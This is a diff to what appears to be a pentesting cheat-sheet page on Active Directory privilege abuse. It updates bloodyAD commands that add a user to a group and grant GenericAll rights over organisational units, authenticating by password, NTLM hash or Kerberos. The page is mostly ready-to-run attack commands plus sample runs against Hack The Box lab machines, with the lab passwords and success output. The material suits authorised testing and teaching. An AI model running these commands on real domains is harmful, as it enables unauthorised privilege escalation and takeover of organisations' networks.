@@ -14,21 +14,26 @@ tags: ["Powerview", "Genericall", "AddMember", "Group Policy", "Domain Controlle
 
 ```console
 # With password
-python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend'
+$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend'
 [+] oorend added to SERVICEMGMT
 ```
 
 ```console
+# With hashes
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add groupMember '<GROUP>' '<USER>'
+```
+
+```console
 # With Kerberos
-python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
+$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
 [+] m.lovegod added to NETWORK AUDIT
 ```
 
@@ -36,21 +41,21 @@ $ python3 bloodyAD.py -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k -
 
 ```console
 # With password
-python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
+$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
 [+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
 ```
 
 ```console
 # With Kerberos
-python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
+$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
 [+] m.lovegod has now GenericAll on NETWORK AUDIT
 ```
 
